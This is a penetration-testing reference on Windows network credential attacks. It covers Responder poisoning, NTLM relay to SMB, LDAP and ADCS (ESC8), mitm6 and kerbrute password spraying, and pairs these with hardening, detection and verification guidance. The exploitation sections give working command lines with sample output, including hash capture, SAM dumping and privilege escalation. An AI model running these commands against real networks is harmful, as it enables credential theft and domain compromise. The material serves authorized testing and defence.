# Password Attacks

Network-level authentication attacks: LLMNR/NBT-NS/mDNS poisoning,
NTLM relay, Responder, WPAD abuse, Kerberos attacks. These target
the credential exchange itself, not the application on top of it.

> [!CAUTION]
> Responder and NTLM relay capture real credentials from real users.
> They are intrusive and can lock out accounts. Only run these
> against networks you own or have written authorization to test.

---

## 1. Overview

Windows networks fall back to legacy name resolution when DNS fails:

- **LLMNR** (Link-Local Multicast Name Resolution) - multicast on
  224.0.0.252 / ff02::1:3.
- **NBT-NS** (NetBIOS Name Service) - broadcast on UDP 137.
- **mDNS** (Multicast DNS) - multicast on 224.0.0.251.

Any host on the segment can answer these queries with its own IP.
The victim then connects to the attacker and sends its NTLM hash
to authenticate.

NTLM relay is a related attack: instead of cracking the captured
hash, the attacker forwards the authentication to another service
the victim has access to (SMB, LDAP, HTTP, MSSQL). If the target
service does not enforce signing or channel binding, the relay
succeeds and the attacker gains the victim's access.

Kerberos attacks (Kerberoasting, AS-REP Roasting, Golden/Silver
tickets) are covered in `INFRASTRUCTURE/01 Active Directory/`. This
file focuses on the network-level precursor: how credentials are
captured in the first place.

---

## 2. Reconnaissance / Enumeration

### 2.1 Check if LLMNR/NBT-NS are enabled

From a Windows host:

```powershell
# LLMNR
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name EnableMulticast -ErrorAction SilentlyContinue

# NBT-NS on the adapter
Get-WmiObject Win32_NetworkAdapterConfiguration |
    Where-Object { $_.IPEnabled } |
    Select-Object Description, TcpipNetbiosOptions
```

`TcpipNetbiosOptions = 0` means "use DHCP setting" (usually enabled).
`= 1` means enabled, `= 2` means disabled.

### 2.2 Check SMB signing

```bash
# Linux
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay-targets.txt

# Or with netexec
netexec smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
```

The output lists hosts with SMB signing disabled - they are relay
targets.

Expected output:

```text
SMB  10.10.10.20  445  DC01  [*] Windows Server 2019 (signing:False)
SMB  10.10.10.21  445  FS01  [*] Windows Server 2016 (signing:True)
```

### 2.3 Check LDAP signing and channel binding

```bash
netexec ldap 10.10.10.20 --query "(objectClass=*)" ""
```

Or use `ldapsearch` with an anonymous bind. If the domain controller
allows anonymous LDAP, it is a relay target for LDAP-based attacks.

### 2.4 Check for WPAD

```bash
# From a Windows host
nslookup wpad.local
nslookup wpad
```

If WPAD resolves, check whether the client actually uses it (see
`file 03`, WPAD hijack section).

### 2.5 Passive capture - listen for LLMNR/NBT-NS

```bash
sudo tcpdump -i eth0 -nn 'udp port 5355 or udp port 137 or udp port 5353'
```

Expected output:

```text
10.0.0.50.5355 > 224.0.0.252.5355: LLMNR query A? fileserver
10.0.0.51.137  > 10.0.0.255.137:  NBT-NS query A? printserver
```

Any LLMNR/NBT-NS query is a potential credential capture.

---

## 3. Common Attack Vectors

### 3.1 LLMNR/NBT-NS poisoning with Responder

Answer every LLMNR/NBT-NS/mDNS query with the attacker's IP. The
victim connects to the attacker and offers NTLM authentication. The
attacker captures the NetNTLMv2 hash (crackable offline) or relays
it (see 3.3).

**Impact:** every mistyped share name or failed DNS lookup on the
segment becomes a credential capture.

### 3.2 WPAD proxy hijack

If WPAD is enabled and no legitimate server exists, the attacker
answers the WPAD query and serves a proxy configuration. All HTTP
traffic from the victim now goes through the attacker, who can
request NTLM authentication.

See `file 03` (DNS/DHCP) for the DNS/DHCP-side delivery.

### 3.3 NTLM relay

The attacker captures an NTLM authentication attempt and forwards it
to another service the victim can access. If the target does not
require SMB/LDAP signing or channel binding (EPA), the authentication
succeeds and the attacker inherits the victim's access.

**Targets that usually accept relay:**

- SMB with signing disabled.
- LDAP without signing requirement and without EPA.
- HTTP/HTTPS services using NTLM (ADCS Web Enrollment, Exchange).
- MSSQL with NTLM auth (rare).

**Tools:** `impacket-ntlmrelayx`, `Responder --relay`, `mitm6` for
IPv6-based relay.

### 3.4 SMB relay to ADCS (ESC8)

Relay to `http://<CA>/certsrv/certfnsh.asp`. If the CA allows HTTP
enrollment with NTLM, the attacker can request a certificate on
behalf of a domain controller or a privileged user, then use it for
PKINIT.

**Impact:** domain escalation to Domain Admin. Covered in more detail
in `INFRASTRUCTURE/01 Active Directory/`.

### 3.5 Password spraying

Instead of brute-forcing one account, try one common password across
many accounts (avoiding lockout). Kerberos pre-auth is the safest
protocol for this.

**Impact:** catches users with default or common passwords, without
triggering account lockout thresholds (usually).

**Tools:** `kerbrute`, `crackmapexec`/`netexec` with a password file.

### 3.6 SMB enumeration and brute force

Once credentials (or a valid username list) are known, brute-force
SMB logins. Slow and noisy - use only against test accounts.

---

## 4. Exploitation Recipes

### 4.1 Responder (capture only)

```bash
# Start Responder in analyze mode first to see what responds
sudo responder -I eth0 -A

# Then in capture mode
sudo responder -I eth0 -wv
```

Flags:

- `-A` = analyze only (no poisoning).
- `-w` = WPAD rogue proxy.
- `-v` = verbose.
- `-F` = force NTLM auth on the WPAD proxy (aggressive).

Expected output (hash captured):

```text
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.0.0.50
[SMB] NTLMv2-SSP Username : CORP\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:...
```

The hash is written to `Responder/logs/`.

### 4.2 Crack NetNTLMv2 with hashcat

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

Mode 5600 = NetNTLMv2. If the password is in the wordlist, you
recover the cleartext.

### 4.3 NTLM relay with ntlmrelayx

```bash
# Step 1: disable SMB/HTTP servers in Responder (edit /etc/responder/Responder.conf)
#   SMB = Off
#   HTTP = Off

# Step 2: start ntlmrelayx
sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks

# Step 3: start Responder in poisoning mode
sudo responder -I eth0 -wv
```

Expected output (relay to SMB):

```text
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 10.0.0.50
[*] SMBD-Thread-3: Authenticating connection from CORP/jdoe
[*] SMBD-Thread-3: Authenticated to 10.10.10.21 (SMB)
[*] SMBD-Thread-3: Dumping SAM hashes
```

With `-socks`, the relayed sessions become SOCKS proxies that can be
reused with `proxychains`.

### 4.4 Relay to LDAP - add user to Domain Admins

```bash
sudo impacket-ntlmrelayx -t ldap://10.10.10.20 --add-computer EVILPC
```

Or use `--escalate-user <user>` to grant DCSync rights.

### 4.5 Relay to ADCS (ESC8)

```bash
# Step 1: identify CA
netexec ldap 10.10.10.20 -u user -p pass -M adcs

# Step 2: relay to the CA's HTTP endpoint
sudo impacket-ntlmrelayx -t http://10.10.10.30/certsrv/certfnsh.asp \
    --adcs --template DomainController
```

The tool requests a certificate on behalf of the relayed account.
If the account is a DC, the certificate can be used for DCSync
via PKINIT.

### 4.6 Password spraying with kerbrute

```bash
# Spray a single password across many users
kerbrute passwordspray -d corp.local users.txt 'Summer2026!'
```

Expected output:

```text
[+] VALID LOGIN: jdoe@corp.local:Summer2026!
[+] VALID LOGIN: asmith@corp.local:Summer2026!
```

Kerberos pre-auth is safer than SMB for spraying (no lockout on
failed pre-auth by default, though modern DCs do count pre-auth
failures).

### 4.7 IPv6-based relay with mitm6 + ntlmrelayx

```bash
# Terminal 1
sudo mitm6 -d corp.local

# Terminal 2
sudo impacket-ntlmrelayx -6 -tf relay-targets.txt -wh wpad.corp.local -socks
```

`mitm6` answers DHCPv6 and RA, becoming the IPv6 DNS server. Windows
clients request WPAD via IPv6, and the attacker relays the
authentication.

---

## 5. Post-Exploitation

After capturing or relaying credentials:

- **Crack NetNTLMv2** offline with hashcat (mode 5600).
- **Relay to services** the victim can access (SMB, LDAP, ADCS).
- **Use captured hashes for Pass-the-Hash** (NTLM hash, not NetNTLMv2).
- **DCSync** if the relayed account has replication rights.
- **Escalate to Domain Admin** via ADCS ESC8.

Captured hashes feed directly into `INFRASTRUCTURE/01 Active
Directory/` attacks: Kerberoasting, AS-REP Roasting, DCSync.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High to Critical |
| Preconditions | Attacker on the same broadcast domain as victims |
| Detectability | Medium - LLMNR/NBT-NS traffic is visible; relays look like normal auth |
| Business impact | Credential theft, lateral movement, domain escalation |

Responder and NTLM relay are **the** standard Windows lateral movement
techniques. In most enterprise networks without hardening, they
escalate from a single user to Domain Admin within hours.

---

## 7. Root Causes (AppSec)

- LLMNR/NBT-NS enabled on Windows clients (default).
- mDNS enabled on modern Windows and macOS.
- SMB signing disabled on servers and workstations (default on many).
- LDAP signing not enforced on domain controllers.
- LDAP channel binding (EPA) not enforced.
- WPAD enabled without a legitimate WPAD server.
- IPv6 enabled on all interfaces (feeds mitm6 attacks).
- ADCS HTTP enrollment allows NTLM without EPA.
- Users mistype share names, triggering LLMNR lookups.

---

## 8. Preventive Controls (AppSec)

### 8.1 Disable LLMNR and NBT-NS

```text
# Group Policy: Computer Configuration >
#   Administrative Templates > Network > DNS Client
#   Turn off Multicast Name Resolution = Enabled

# Registry (per host):
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient
  EnableMulticast = 0

# Disable NetBIOS over TCP/IP on all adapters:
# Network adapter properties > IPv4 > Advanced > WINS
#   Disable NetBIOS over TCP/IP
```

Or via DHCP option 001 (Microsoft-specific) to disable NetBIOS.

### 8.2 Enforce SMB signing

```text
# Group Policy: Computer Configuration >
#   Windows Settings > Security Settings > Local Policies >
#   Security Options > "Microsoft network server: Digitally sign
#   communications (always)" = Enabled
```

Also on workstations (not just servers). Without this, relaying
succeeds.

### 8.3 Enforce LDAP signing and channel binding

```text
# On domain controllers:
# Registry (or GPO):
HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
  LDAPServerIntegrity = 2
  LdapEnforceChannelBinding = 2
```

`LDAPServerIntegrity = 2` = require signing.
`LdapEnforceChannelBinding = 2` = require EPA (Extended Protection).

### 8.4 Disable WPAD

See `file 03` (DNS and DHCP Attacks) for the exact registry keys.

### 8.5 Harden ADCS

- Disable HTTP enrollment; use HTTPS only (with EPA required).
- Require EPA on all ADCS web endpoints.
- Remove `Domain Users` enrollment rights on templates that allow
  domain authentication.
- Enable "CA certificate managers" audit.

### 8.6 Disable IPv6 where not used

```powershell
# Disable IPv6 on all adapters
Get-NetAdapterBinding -ComponentID ms_tcpip6 | Disable-NetAdapterBinding
```

If IPv6 is required, use RA Guard and DHCPv6 Guard (see file 04).

### 8.7 Account lockout policy

- Set lockout threshold (e.g. 5 attempts / 15 minutes).
- This makes password spraying harder but does not stop it entirely
  (attackers can spray slowly).

### 8.8 Privileged Access Workstations (PAW)

- Admin accounts only log in from dedicated, hardened workstations.
- Reduces the blast radius of a captured admin credential.

---

## 9. Detection Controls (AppSec)

### 9.1 LLMNR/NBT-NS traffic

- LLMNR query volume per host (baseline, then alert on jumps).
- Multiple hosts answering the same LLMNR query (poisoning).
- NBT-NS queries for non-existent names (typosquatting targets).

### 9.2 NTLM authentication anomalies

- NTLM authentication to non-standard servers (relay targets).
- NTLM authentication from a workstation to a workstation
  (should be rare in a modern environment).
- NTLM authentication to ADCS web endpoints.

### 9.3 Kerberos anomalies

- Failed pre-auth attempts (password spraying).
- New SPNs requested by unusual accounts (Kerberoasting).
- AS-REP requests for accounts without pre-auth (AS-REP Roasting).

### 9.4 Windows Event IDs

- **4625** - failed logon (spraying).
- **4776** - NTLM authentication (relay indicator if unusual).
- **4768/4769** - Kerberos TGT/TGS requests (roasting).
- **4769** with encryption type 0x17 (RC4) - Kerberoasting indicator.

### 9.5 SIEM rules

- Alert on > N NTLM authentications to a single host in a short window.
- Alert on NTLM authentication from a user to a host they never
  accessed before.
- Alert on LDAP binds without signing (if signing is enforced, this
  should be zero).

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **LLMNR disabled:** from a Windows host, `nslookup` a non-existent
   name. No LLMNR query should appear in `tcpdump`.
2. **SMB signing:** run `crackmapexec`/`netexec` with `--gen-relay-list`.
   No hosts should appear in the list.
3. **LDAP signing:** attempt an unsigned LDAP bind from a Linux host
   (`ldapsearch -x -H ldap://dc`). Should be rejected.
4. **EPA:** attempt an NTLM relay to the ADCS web endpoint without
   channel binding. Should be rejected.
5. **Password spraying:** run kerbrute against a test account with
   the lockout policy applied. The account should lock after the
   threshold, and the event log should show 4625 / 4740.

---

## 11. OSCP Notes

Password attacks are **heavily tested** in the OSCP exam:

- Responder and NTLM relay appear in the AD section of the exam.
- Kerberoasting and AS-REP Roasting are expected techniques.
- Password spraying is often the initial foothold.

**Report tips:**

- Document the captured hash type (NetNTLMv2, TGS-REP, AS-REP).
- Show the crack command and the recovered password.
- For relay, document the target service, the tool, and the result
  (session created, user added, etc.).
- Explain the control that would have prevented the attack
  (SMB signing, LDAP signing, EPA, disabled LLMNR).

See `methodology/OSCP-Reporting.md` for the report structure.

---

## 12. Production Notes

- **Responder is loud.** Any modern EDR or NDR flags it within
  seconds. Assume detection.
- **NTLM relay requires disabling Responder's SMB/HTTP servers.**
  Otherwise Responder answers the auth itself instead of passing it
  to ntlmrelayx. Edit `Responder.conf`.
- **Relay targets must be identified first.** Do not blindly relay;
  enumerate signing status with `netexec smb --gen-relay-list`.
- **Relay to ADCS (ESC8) is the highest-value path** in most modern
  AD environments. Prioritize ADCS enumeration.
- **Password spraying can lock out accounts.** Use a threshold lower
  than the lockout policy (e.g. 3 attempts per hour if lockout is at 5).
- **Captured NetNTLMv2 is not directly usable** for Pass-the-Hash.
  Crack it to cleartext, or relay it in real time.
- **NTLM hash (from SAM/LSASS) IS usable** for Pass-the-Hash and
  Overpass-the-Hash.

---

## 13. References

- Responder - LLMNR/NBT-NS/mDNS poisoner - https://github.com/lgandx/Responder
- impacket - ntlmrelayx, secretsdump, etc. - https://github.com/fortra/impacket
- mitm6 - IPv6-based relay - https://github.com/dirkjanm/mitm6
- netexec - SMB/LDAP/MSSQL enumeration and relay - https://github.com/Pennyw0rth/NetExec
- kerbrute - Kerberos password spraying - https://github.com/ropnop/kerbrute
- hashcat - mode 5600 (NetNTLMv2) - https://hashcat.net/hashcat/
- MITRE ATT&CK T1557.001 - LLMNR/NBT-NS Poisoning - https://attack.mitre.org/techniques/T1557/001/
- MITRE ATT&CK T1557.002 - ARP Cache Poisoning - https://attack.mitre.org/techniques/T1557/002/
- MITRE ATT&CK T1110 - Brute Force - https://attack.mitre.org/techniques/T1110/
- NIST SP 800-115 - Technical Guide to Information Security Testing
- Microsoft Docs - "Mitigating Pass-the-Hash and Other Credential Theft"
- ADSecurity.org - ADCS ESC8, NTLM relay guides
